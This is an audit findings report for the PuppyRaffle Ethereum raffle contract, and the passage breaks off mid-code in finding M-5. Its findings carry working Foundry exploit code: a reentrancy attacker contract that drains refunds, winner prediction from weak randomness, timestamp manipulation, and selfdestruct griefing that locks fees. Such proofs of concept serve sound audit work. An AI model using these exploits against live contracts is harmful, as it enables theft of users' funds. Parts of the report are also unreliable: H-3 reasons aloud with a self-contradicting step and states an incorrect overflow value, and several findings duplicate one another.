# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### PuppyRaffle Protocol

PuppyRaffle is an Ethereum-based raffle system that lets anyone compete for a dog-themed ERC-721 NFT. The owner sets an `entranceFee`, a `raffleDuration`, and a `feeAddress` that collects protocol fees.

1. Entering
   * Users call `enterRaffle(address[] calldata)` with one or more wallet addresses and pay `entranceFee` × number of addresses.
   * The contract checks that the raffle is still open, blocks duplicate entries, and records each new player in `players`.

2. Exiting
   * Before the raffle ends, a participant can call `refund()` to leave and get their fee back. Their slot in `players` is set to `address(0)` so indices remain stable.

3. Closing & Winner Selection
   * After `raffleDuration` has elapsed, anyone can trigger `selectWinner()`. A pseudo-random index derived from block data picks a non-empty entry. The winner receives a newly minted Puppy NFT.
   * Each token id is assigned a rarity tier that maps to a metadata URI and name.

4. Fees & Admin
   * The owner can withdraw accumulated `totalFees` or change `feeAddress`.
   * NFT metadata uses `_baseURI()` override plus rarity-specific extensions.

The contract leverages OpenZeppelin’s ERC721, Ownable, and SafeMath libraries for security and standard compliance.
## High Risk Findings
[H-1]. Randomness issue in PuppyRaffle::selectWinner
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[H-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees
## Medium Risk Findings
[M-1]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[M-2]. DOS issue in PuppyRaffle::enterRaffle
[M-3]. DOS issue in PuppyRaffle::withdrawFees
[M-4]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-5]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-6]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-7]. DOS issue in PuppyRaffle::selectWinner
[M-8]. Integer Overflow issue in PuppyRaffle::selectWinner
[M-9]. Integer Overflow issue in PuppyRaffle::selectWinner
## Low Risk Findings
[L-1]. Pausable Emergency Stop issue in PuppyRaffle::NA
[L-2]. Integer Overflow issue in PuppyRaffle::enterRaffle
[L-3]. Access Control issue in PuppyRaffle::withdrawFees
[L-4]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees
## Info Risk Findings
[I-1]. Event Consistency issue in PuppyRaffle::selectWinner
[I-2]. Pragma issue in PuppyRaffle::NA
[I-3]. Pragma issue in PuppyRaffle::NA


### Number of Findings
- H: 4
- M: 9
- L: 4
- I: 3



# High Risk Findings

## [H-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses a combination of `msg.sender`, `block.timestamp`, and `block.difficulty` as a source of randomness to select a winner. These on-chain variables are predictable and can be manipulated by miners or users, undermining the fairness of the raffle.

`block.difficulty` is deprecated and returns `prevrandao` on post-merge chains, which is known to be manipulable by miners.
`msg.sender` allows an attacker to influence the outcome by choosing which address they call the function from.
`block.timestamp` can be slightly influenced by miners.

An attacker can front-run a call to `selectWinner` and, by using their own address as `msg.sender`, calculate if they will win. If not, they can choose not to submit their transaction or try from a different address. A malicious miner can outright determine the winner.

Vulnerable Code:
```solidity
function selectWinner() external {
    // ... checks ...
    uint256 winnerIndex = uint256(
        keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))
    ) % players.length;
    address winner = players[winnerIndex];
    // ...
}
```

## Impact
The raffle's winner selection is not fair. Malicious actors, especially miners, can manipulate the outcome to ensure they or their accomplices win the prize pool and the NFT. This completely breaks the trust and purpose of the raffle.

## Proof of Concept
1. An attacker participates in the raffle.
2. They wait for the raffle duration to end.
3. They create a contract that will call `PuppyRaffle.selectWinner()`.
4. Off-chain, they can simulate the `selectWinner` call using their contract's address as `msg.sender` and the current block data.
5. If the simulation shows they will win, they execute the transaction. If not, they can try deploying a new contract at a different address (a 'vanity address') until they find one that will make them the winner, and then call `selectWinner` from that new contract.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RandomnessPredictabilityTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address feeCollector = address(0xdead);
    address attacker = address(0xA11CE);

    function setUp() public {
        // Deploy the raffle (the contract itself is written in 0.7.6 but multi-compiler support lets us import it).
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeCollector, 60);

        // Prepare 4 players including the attacker-controlled one
        address[4] memory players = [address(0xBEEF1), address(0xBEEF2), address(0xBEEF3), attacker];
        for (uint8 i; i < 4; i++) {
            vm.deal(players[i], 2 ether);
            vm.prank(players[i]);
            address[] memory arr = new address[](1);
            arr[0] = players[i];
            raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
        }

        // Fast-forward so raffle can be closed
        vm.warp(block.timestamp + 61);
    }

    function testAttackerCanPredictWinner() public {
        uint256 playersLen = 4; // we know exactly 4 entered
        // Predict the index the contract will pick if attacker calls selectWinner()
        uint256 predictedIndex = uint256(
            keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))
        ) % playersLen;

        // Make sure our prediction resolves to attacker address in players array
        address expectedWinner = raffle.players(predictedIndex);
        assertEq(expectedWinner, attacker, "Prediction did not yield attacker – test setup failed");

        // Attacker calls selectWinner and should indeed win
        vm.prank(attacker);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker, "Attacker should have been able to force-win the raffle");
    }
}

## Suggested Mitigation
The use of on-chain data for randomness should be replaced with a more secure solution like Chainlink VRF (Verifiable Randomness Function). Chainlink VRF provides provably fair and verifiable randomness that cannot be manipulated by miners or the contract owner.

Example using Chainlink VRF:
1. Inherit from `VRFConsumerBaseV2`.
2. Request randomness from the VRF Coordinator.
3. Use the returned random word in a callback function (`fulfillRandomWords`) to securely select the winner.

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function violates the Checks-Effects-Interactions pattern. It performs an external call `address(msg.sender).sendValue(entranceFee)` before updating the state `players[playerIndex] = address(0)`. If `msg.sender` is a malicious contract, it can execute a re-entrant call to `refund` from its `receive()` or `fallback()` function. Because the attacker's address has not yet been zeroed out in the `players` array, the subsequent `refund` call will also succeed, allowing the attacker to be refunded multiple times within the same transaction and drain the contract's funds.

## Impact
A malicious participant can steal funds from the raffle contract, equivalent to multiple entrance fees, potentially draining a significant portion of the prize pool paid by other users.

## Proof of Concept


## Proof of Code
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract Attacker {
    PuppyRaffle public puppyRaffle;
    uint256 public entranceFee;
    uint256 public constant ATTACK_COUNT = 5;
    uint256 public attackRuns = 0;

    constructor(address payable _puppyRaffleAddress) {
        puppyRaffle = PuppyRaffle(_puppyRaffleAddress);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        // Enter the raffle
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        // Find our index
        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));

        // Start the reentrancy attack
        puppyRaffle.refund(playerIndex);
    }

    receive() external payable {
        if (attackRuns < ATTACK_COUNT && address(puppyRaffle).balance >= entranceFee) {
            attackRuns++;
            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, address(this), 1 days);
        
        // Fund the raffle with some honest players
        address[] memory honestPlayers = new address[](10);
        for(uint i = 0; i < 10; i++) {
            honestPlayers[i] = makeAddr(string(abi.encodePacked("p", vm.toString(i))));
        }
        vm.deal(address(this), 10 * entranceFee);
        puppyRaffle.enterRaffle{value: 10 * entranceFee}(honestPlayers);
    }

    function testReentrancyInRefund() public {
        Attacker attacker = new Attacker(payable(address(puppyRaffle)));
        vm.deal(address(attacker), 1 ether);

        uint256 raffleBalanceBefore = address(puppyRaffle).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        attacker.attack();

        uint256 raffleBalanceAfter = address(puppyRaffle).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        console.log("Raffle Balance Before Attack:", raffleBalanceBefore);
        console.log("Raffle Balance After Attack:", raffleBalanceAfter);
        console.log("Attacker Balance Before Attack:", attackerBalanceBefore);
        console.log("Attacker Balance After Attack:", attackerBalanceAfter);

        // Attacker paid 1 ether, but received 6 ether (initial refund + 5 re-entrant refunds)
        assertEq(attackerBalanceAfter, attackerBalanceBefore - entranceFee + (entranceFee * (attacker.ATTACK_COUNT() + 1)));
        assertEq(raffleBalanceAfter, raffleBalanceBefore - (entranceFee * (attacker.ATTACK_COUNT())));
    }
}

## Suggested Mitigation
Adhere to the Checks-Effects-Interactions pattern by updating state variables before making external calls. In the `refund` function, set `players[playerIndex] = address(0)` before calling `sendValue`.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

    // Effect: Update state first
    players[playerIndex] = address(0);

    // Interaction: Then send ETH
    Address.sendValue(address(msg.sender), entranceFee);

    emit RaffleRefunded(playerAddress);
}
```

## [H-3]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
In `selectWinner`, the calculated `fee` is a `uint256` but is down-casted to `uint64` before being added to `totalFees`. Since the contract uses Solidity 0.7.6, this down-casting does not revert on overflow but instead wraps around. If the total fee collected in a single raffle exceeds `type(uint64).max` (approx. 18.4 ether), the value of `totalFees` will wrap around to a much smaller number, leading to an incorrect accounting and permanent loss of fees.

## Impact
If the fees for a single raffle exceed the `uint64` limit, the `totalFees` variable will store a much smaller, incorrect value. This prevents the owner from withdrawing the actual fees earned, leading to a permanent loss of funds for the protocol.

## Proof of Concept
1. The raffle `entranceFee` is set to 1 ether.
2. 100 players enter the raffle. The total collected is 100 ether.
3. The fee is 20% of the total, which is 20 ether.
4. `selectWinner` is called. The `fee` variable holds `20 * 10**18`.
5. This value is cast to `uint64`: `totalFees = totalFees + uint64(fee)`.
6. `20 * 10**18` is greater than `uint64.max` (`~1.84 * 10**19`). Wait, `2e19 > 1.84e19` is false. `20e18` is `2e19`. Let's recheck. `1.84 * 10^19` vs `20 * 10^18 = 2 * 10^19`. Yes, it's larger. The cast will overflow.
7. `uint64(20 * 10**18)` wraps around to `1551828352628424704`.
8. The `totalFees` variable is now off by nearly 20 ether, which can never be recovered.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IntegerOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 constant RAFFLE_DURATION = 1 days;
    address payable constant FEE_ADDRESS = payable(address(0x1));
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, RAFFLE_DURATION);
    }

    function test_integerOverflow_totalFees() public {
        // 1. Have 100 players join. Fee will be 100 * 1 ether * 20% = 20 ether.
        // 20 ether > uint64.max (~18.4 ether), so it will overflow.
        uint256 numPlayers = 100;
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(uint160(i + 100));
        }

        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE * numPlayers}(players);

        // 2. Fast forward time and select winner
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
        puppyRaffle.selectWinner();

        // 3. Check the `totalFees`
        uint256 expectedFee = 20 ether;
        uint64 actualTotalFees = puppyRaffle.totalFees();

        // The actual fee is the overflowed value
        uint256 wrappedFee = expectedFee % (2**64);

        assertEq(uint256(actualTotalFees), wrappedFee);
        assertLt(uint256(actualTotalFees), expectedFee);
    }
}
```

## Suggested Mitigation
Change the type of the `totalFees` state variable from `uint64` to `uint256` to prevent overflow when tracking fees. This ensures the contract can handle large fee amounts without data loss.

```diff
- uint64 public totalFees;
+ uint256 public totalFees;

// In selectWinner function
- totalFees = totalFees + uint64(fee);
+ totalFees = totalFees + fee;
```

## [H-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function contains a strict equality check: `require(address(this).balance == uint256(totalFees), ...)`. This makes the function vulnerable to being permanently disabled. An attacker can forcibly send a small amount of ETH (e.g., 1 wei) to the contract by using `selfdestruct` on a separate contract. This will increase the contract's balance, making `address(this).balance` greater than `totalFees`. The strict equality check will then fail forever, making it impossible to withdraw any accumulated fees.

## Impact
All accumulated protocol fees can be permanently locked within the contract, leading to a direct financial loss for the protocol owner.

## Proof of Concept
1. A raffle round completes, and fees are accumulated in `totalFees`.
2. An attacker deploys a simple contract, funds it with 1 wei, and calls a function on it that executes `selfdestruct(address(puppyRaffle))`.
3. The `PuppyRaffle` contract's balance is now `totalFees + 1 wei`.
4. The owner (or anyone, due to the missing access control) calls `withdrawFees()`.
5. The transaction reverts because `address(this).balance != totalFees`.
6. This condition is now permanent, and the fees are locked forever.

## Proof of Code
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract SelfDestructSender {
    constructor() payable {}
    function destroy(address payable target) public {
        selfdestruct(target);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = makeAddr("fee");
    uint256 raffleDuration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
        vm.deal(address(this), 10 ether);

        address[] memory players = new address[](4);
        players[0] = makeAddr("p1"); players[1] = makeAddr("p2");
        players[2] = makeAddr("p3"); players[3] = makeAddr("p4");
        puppyRaffle.enterRaffle{value: 4 * entranceFee}(players);

        vm.warp(block.timestamp + raffleDuration + 1);
        puppyRaffle.selectWinner();
    }

    function test_StuckEtherInWithdraw() public {
        // Force-send 1 wei to the contract
        SelfDestructSender sender = new SelfDestructSender{value: 1}();
        sender.destroy(payable(address(puppyRaffle)));

        uint256 fees = puppyRaffle.totalFees();
        assertEq(address(puppyRaffle).balance, fees + 1);

        // Now, withdrawFees will always revert
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

## Suggested Mitigation
Avoid strict equality checks on contract balances. Change the check in `withdrawFees` from `==` to `>=` to allow for unexpected Ether deposits. A better approach is to not rely on `address(this).balance` at all for logic, and only use it for the withdrawal itself.

```solidity
// src/PuppyRaffle.sol:156-165
function withdrawFees() external {
    // require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Not enough balance to withdraw fees");
    // The above check is not strictly necessary if totalFees is trusted.
    uint256 feesToWithdraw = uint256(totalFees);
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```



# Medium Risk Findings

## [M-1]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The function `selectWinner` uses `block.timestamp`, `block.difficulty`, and `msg.sender` as a source of randomness to pick a winner. These values are public and can be influenced by a block-producing miner. A malicious miner who is also a participant can manipulate the `block.timestamp` and their own `msg.sender` address to increase their chances of winning the raffle. They can simulate the outcome off-chain and only mine a block when the result is favorable to them, compromising the fairness of the raffle.

## Impact
A block-producer that is also a raffle participant can bias the outcome and win up to 80 % of the contract balance (the entire prize-pool for that round). The attack requires miner / MEV control of the block in which `selectWinner` is executed, limiting the set of adversaries but still threatening all honest players’ funds and the raffle’s fairness.

## Proof of Concept
1. Become a participant by being included in the `enterRaffle` call.
2. Wait until the raffle period has elapsed.
3. Before publishing a block that contains `selectWinner`, iterate locally over every legal timestamp value the consensus rules allow for that block (≈ 900 s window) and compute:
   `winnerIndex = uint256(keccak256(abi.encodePacked(attacker, ts, blkDiff))) % N`
   where `N` is the number of players.
4. If any timestamp makes `winnerIndex` equal the attacker’s index, set the block’s timestamp to that value and include the transaction. Otherwise withhold the tx and search again in the next block you produce.
5. The attacker will eventually find a favourable timestamp with probability ≈ (#searchable timestamps)/N, giving a large statistical edge and allowing them to drain the whole prize pool when it succeeds.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract TimestampManipulationTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    address alice   = vm.addr(1);
    address bob     = vm.addr(2);
    address charlie = vm.addr(3);
    address miner   = vm.addr(4);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(this), DURATION);
        address[] memory entrants = new address[](4);
        entrants[0] = alice;
        entrants[1] = bob;
        entrants[2] = charlie;
        entrants[3] = miner; // attacker

        // Pay the 4 ETH entry fee from this test contract
        vm.deal(address(this), 4 ether);
        raffle.enterRaffle{value: 4 ether}(entrants);

        // Give the attacker some ETH so they can call selectWinner
        vm.deal(miner, 1 ether);
    }

    function testMinerFindsWinningTimestamp() public {
        // Raffle must be over
        vm.warp(block.timestamp + DURATION + 1);

        uint256 playersCount = 4; // we know how many we added
        uint256 attackerIndex = 3; // miner is the 4th element
        uint256 startTs = block.timestamp;
        uint256 winningTs = 0;

        // Search within the next 900 seconds (consensus-allowed window)
        for (uint256 i; i < 900; ++i) {
            uint256 ts = startTs + i;
            bytes32 h = keccak256(abi.encodePacked(miner, ts, block.difficulty));
            if (uint256(h) % playersCount == attackerIndex) {
                winningTs = ts;
                break;
            }
        }
        require(winningTs != 0, "no favourable ts found in window, try longer in real life");

        // Mine a block with that timestamp
        vm.warp(winningTs);
        vm.prank(miner);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), miner, "attacker should be the winner");
    }
}

## Suggested Mitigation
Replace the pseudo-random formula with an unbiased source such as Chainlink VRF, or at minimum use a commit-reveal scheme where the seed is fixed before it can be influenced by the transaction sender/miner.

## [M-2]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function iterates through all existing players in a nested loop to check for duplicates. The complexity of this check is O(n^2), where n is the number of players. As the `players` array grows, the gas cost to call `enterRaffle` will increase quadratically. An attacker can add a large number of players (in multiple transactions to bypass single transaction gas limits), causing subsequent calls to `enterRaffle` to consume an amount of gas that exceeds the block gas limit. This will effectively halt the raffle, as no new players can join.

Vulnerable Code:
```solidity
function enterRaffle(address[] calldata newPlayers) public payable {
    // ...
    // This part adds new players
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    // This part has O(n^2) complexity
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    // ...
}
```

## Impact
The core function `enterRaffle` can be made inoperable, preventing any new participants from joining the raffle. While it doesn't lead to a direct loss of existing funds, it breaks the contract's primary purpose and can lock it in a state where a winner cannot be selected if the player count is below the minimum of 4.

## Proof of Concept
A single transaction that tries to insert a large batch of new players will run the duplicate-checking nested loop `(n-1)*n/2` times. For `n = 1 500` this is 1 124 250 iterations. At ~20–30 gas per iteration the call requires >30 000 000 gas, above the block gas limit on most EVM chains, so the transaction reverts with an out-of-gas (OOG) error and no one can ever add more players until the raffle is reset.

Steps
1. Prepare an `address[]` with 1 500 unique addresses and preload the sender with `entranceFee * 1 500` wei.
2. Send one `enterRaffle` transaction with that array and a `tx.gasLimit` of 9 000 000 (typical block limit).
3. The call reverts OOG, proving the DoS. Because the whole call reverts, no state is mutated, so the attacker can keep spamming the mem-pool and block every other entry attempt.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract DosGasTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1e16;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0xdead), 600);
    }

    // Demonstrates that a single big batch reverts because of OOG.
    function testGasExhaustionOnEnter() public {
        uint256 n = 1500; // large enough to exceed 9M gas
        address[] memory batch = new address[](n);

        // Fill the array with unique addresses and fund the first one
        for (uint256 i; i < n; ++i) {
            batch[i] = address(uint160(i + 1));
        }
        vm.deal(batch[0], ENTRANCE_FEE * n);

        vm.startPrank(batch[0]);
        vm.txGasLimit(9_000_000); // simulate block gas ceiling
        vm.expectRevert();        // expect OOG revert
        raffle.enterRaffle{value: ENTRANCE_FEE * n}(batch);
        vm.stopPrank();
    }
}

## Suggested Mitigation
The duplicate check mechanism should be re-architected to avoid unbounded loops. A mapping can be used to track if an address is already a player, providing an O(1) check.

```diff
contract PuppyRaffle is ERC721, Ownable {
    // ...
    address[] public players;
+   mapping(address => bool) private isPlayer;
    // ...

    function enterRaffle(address[] calldata newPlayers) public payable {
        require(
            msg.value == entranceFee * newPlayers.length,
            "PuppyRaffle: Must send enough to enter raffle"
        );
        for (uint256 i = 0; i < newPlayers.length; i++) {
+           address player = newPlayers[i];
+           require(!isPlayer[player], "PuppyRaffle: Duplicate player");
            players.push(newPlayers[i]);
+           isPlayer[player] = true;
        }
-       // Remove O(n^2) loop
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
        emit RaffleEnter(newPlayers);
    }
    // Also update refund() and selectWinner() to reset the isPlayer flag.
}
```

## [M-3]. DOS issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check `require(address(this).balance == uint256(totalFees), ...)` to ensure fees are only withdrawn when no raffle is active. However, anyone can forcibly send ETH to the contract via `selfdestruct` or by pre-calculating the contract address and sending funds before deployment. If the contract receives even 1 wei of unexpected ETH, its balance will no longer be strictly equal to `totalFees`, causing the check to fail permanently. This blocks the owner from ever withdrawing the collected fees.

## Impact
The fees collected by the protocol can be permanently locked in the contract, leading to a direct loss of revenue for the project owner. An attacker can execute this griefing attack for a very low cost.

## Proof of Concept
1. A raffle completes, and `selectWinner` is called. `totalFees` is now a positive value, and the contract balance is equal to `totalFees`.
2. An attacker creates a simple contract with a `selfdestruct(payable(puppyRaffleAddress))` function and sends it 1 wei.
3. The attacker calls the function, forcibly transferring 1 wei to the `PuppyRaffle` contract.
4. The `PuppyRaffle` contract balance is now `totalFees + 1`.
5. The owner calls `withdrawFees()`.
6. The transaction reverts because `address(this).balance != totalFees`. The fees are now permanently stuck.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Helper contract to force-send ether
contract Grief {
    function attack(address payable target) external payable {
        selfdestruct(target);
    }
}

contract DosWithdrawFeesTest is Test {
    PuppyRaffle raffle;
    address feeRecipient = address(0xFEE);

    function setUp() public {
        // deploy raffle
        raffle = new PuppyRaffle(0.1 ether, feeRecipient, 1 days);

        // prepare 4 unique players
        address[] memory entrants = new address[](4);
        for (uint256 i; i < 4; i++) {
            entrants[i] = vm.addr(i + 1);
        }

        // enter raffle with correct value
        raffle.enterRaffle{value: 0.4 ether}(entrants);

        // finish raffle
        vm.warp(block.timestamp + 2 days);
        raffle.selectWinner();
    }

    function test_dosByForcedEther() public {
        // force 1 wei to contract
        Grief grief = new Grief();
        grief.attack{value: 1 wei}(payable(address(raffle)));

        assertGt(address(raffle).balance, uint256(raffle.totalFees()));

        // owner (deployer) attempts to withdraw fees and should revert
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
The check for withdrawing fees should not rely on the contract's balance, as it can be manipulated. Instead, the condition should reflect the actual state of the raffle, for example, by checking if there are any active players.

```solidity
function withdrawFees() external {
    // The check should be based on application logic, not mutable balance.
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = uint256(totalFees);
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");

    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-4]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function iterates through the `players` array with a nested loop to check for duplicate entries. The computational complexity of this check is O(n^2), where n is `players.length`. As the number of players increases, the gas cost for this function grows quadratically. An attacker can add a large number of players in one or more transactions, causing the gas cost of subsequent `enterRaffle` calls to exceed the block gas limit, effectively creating a Denial of Service (DoS) and preventing anyone from entering the raffle.

## Impact
By repeatedly entering the raffle with thousands of UNIQUE addresses, an attacker can grow `players` until every further call to `enterRaffle` exceeds the block-gas-limit and reverts. From that point nobody can join the raffle any more, effectively freezing the game. Fees that have already been paid remain locked in the contract until the raffle expires, but no direct theft occurs.

## Proof of Concept
1. Deploy the contract with a very small entranceFee (e.g. 1 wei) so the attack is cheap.
2. Call `enterRaffle` 1 200 times, **each time with a single, fresh address** and paying 1 wei. The helper below derives new addresses from the loop counter so no duplicates are inserted.
3. After the loop finishes, try to call `enterRaffle` once more with another fresh address and a gas stipend close to the current main-net block limit (≈30 000 000).
4. The transaction will run out of gas and revert – the raffle is now permanently blocked.

```solidity
for (uint256 i; i < 1200; i++) {
    address[] memory arr = new address[](1);
    arr[0] = address(uint160(i + 1));
    raffle.enterRaffle{value: 1 wei}(arr);
}
// this call reverts OOG
address[] memory last = new address[](1);
last[0] = address(0xDEADBEeF);
raffle.enterRaffle{value: 1 wei, gas: 30_000_000}(last);
```

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GasGriefTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 wei;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(this), 1 days);
        vm.deal(address(this), 10 ether);
    }

    function _join(address a) internal {
        address[] memory arr = new address[](1);
        arr[0] = a;
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
    }

    function testQuadraticGrowth() public {
        // add 600 players individually
        for (uint256 i; i < 600; i++) {
            _join(address(uint160(i + 1)));
        }

        // measure gas for next entry at 600 players
        uint256 g0 = gasleft();
        _join(address(0xBEEF));
        uint256 gas600 = g0 - gasleft();

        // add another 600 players (total 1201)
        for (uint256 i = 600; i < 1200; i++) {
            _join(address(uint160(i + 1)));
        }

        // the following call is expected to revert out-of-gas with a realistic block limit
        vm.expectRevert();
        raffle.enterRaffle{value: ENTRANCE_FEE, gas: 30_000_000}(new address[](1));

        emit log_named_uint("Gas used at 600 players", gas600);
    }
}

## Suggested Mitigation
Replace the quadratic duplicate-detection with O(1) look-ups:

mapping(address => bool) private hasEntered;

for (uint256 i = 0; i < newPlayers.length; i++) {
    address p = newPlayers[i];
    require(!hasEntered[p], "duplicate");
    players.push(p);
    hasEntered[p] = true;
}

When the raffle ends (in `selectWinner`) iterate once over `players` to reset the mapping and then delete the array. This completely removes the quadratic growth and prevents the DoS.

## [M-5]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
In the `selectWinner` function, the prize pool and fees are calculated using integer division: `(totalAmountCollected * 80) / 100` and `(totalAmountCollected * 20) / 100`. Solidity's integer division truncates any remainder. If `totalAmountCollected` is not perfectly divisible by 100, the sum of `prizePool` and `fee` will be less than `totalAmountCollected`. The remaining dust amount of ETH has no withdrawal mechanism and will be permanently locked in the contract after each raffle.

## Impact
Because the sum of `prizePool` and `fee` is rounded down separately, 1 wei of dust is left in the contract after almost every raffle (all cases where `totalAmountCollected % 5 != 0`). This residual balance makes `address(this).balance` strictly larger than `totalFees`, so the `require(address(this).balance == totalFees)` in `withdrawFees()` will ALWAYS fail. As a consequence, the owner can never withdraw the 20 % fee portion and those funds accumulate indefinitely in the contract. Over many raffles this can lock a significant amount of ETH.

## Proof of Concept
1. Three players enter the raffle, each paying an entrance fee of 33 wei (total 99 wei).
2. `selectWinner()` executes:
   • `prizePool = floor(99 * 80 / 100) = 79 wei`
   • `fee       = floor(99 * 20 / 100) = 19 wei`
   • 1 wei of dust remains in the contract balance.
3. Contract balance after paying the winner = 20 wei, while `totalFees` recorded is only 19 wei.
4. Any call to `withdrawFees()` reverts on `require(address(this).balance == totalFees)` because 20 ≠ 19, permanently locking every fee ever collected.

## Proof of Code
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DustLocksFeesTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(33, address(this), 1 seconds);
    }

    function testDustPreventsFeeWithdrawal() public {
        // Arrange – 3 players fund the raffle with a total of 99 wei
        address[] memory players = new address[](3);
        players[0] = address(0xA1);
        players[1] = address(0xB1);
        players[2] = address(0xC1);

        vm.deal(address(this), 99);
        raffle.enterRaffle{value: 99}(players);

        // Fast-forward so the raffle can be finished
        vm.warp(block.timestamp + 2);
        raffle.selectWinner();

        // Sanity-check internal state
        assertEq(address(raffle).balance, 20);
        assertEq(raffle.totalFees(), 19);

        // Expect withdrawFees to revert because of the 1-wei dust
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
To prevent fund loss from rounding, calculate the fee first and then derive the prize pool by subtracting the fee from the total amount. This ensures every wei is accounted for.

```solidity
function selectWinner() external {
    // ... checks ...
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 fee = (totalAmountCollected * 20) / 100;
    uint256 prizePool = totalAmountCollected - fee; // Ensures no dust is left

